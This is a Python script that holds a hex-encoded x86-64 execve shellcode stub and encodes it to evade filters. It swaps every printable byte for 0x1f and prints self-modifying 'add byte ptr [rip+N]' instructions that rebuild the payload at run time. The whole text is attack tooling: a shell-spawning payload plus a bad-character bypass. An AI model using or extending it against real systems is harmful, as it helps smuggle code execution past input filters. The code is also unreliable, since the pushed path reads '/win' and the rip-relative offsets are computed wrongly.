hex_string = "48 31 c0 50 48 c7 c3 2f 77 69 6e 53 48 89 e7 48 31 f6 48 31 d2 48 c7 c0 3b 00 00 00 0f 05"

# Function to split offset into non-ASCII components
def split_offset(offset):
    result = []
    while offset > 0:
        if offset > 0x1f:
            part = 0x1f
        else:
            part = offset
        result.append(part)
        offset -= part
    return result

# Split the string into individual hex values
hex_values = hex_string.split()

# Initialize the two output strings
converted_string = ""
offset_string = ""

for index, hex_val in enumerate(hex_values):
    original_ascii = int(hex_val, 16)
    
    if 32 <= original_ascii <= 126:
        # Convert to the highest non-printable ASCII character
        new_ascii = 0x1f
        converted_string += f"{new_ascii:02x} "
        
        # Calculate the offset from the start of the string
        string_offset = index
        offset = original_ascii - new_ascii
        parts = split_offset(offset)
        for part in parts:
            offset_string += f"add byte ptr [rip+{string_offset}], {part:#x}\n"
    else:
        converted_string += f"{hex_val} "

print("Converted string:", converted_string.strip())
print("Offset string:\n", offset_string.strip())
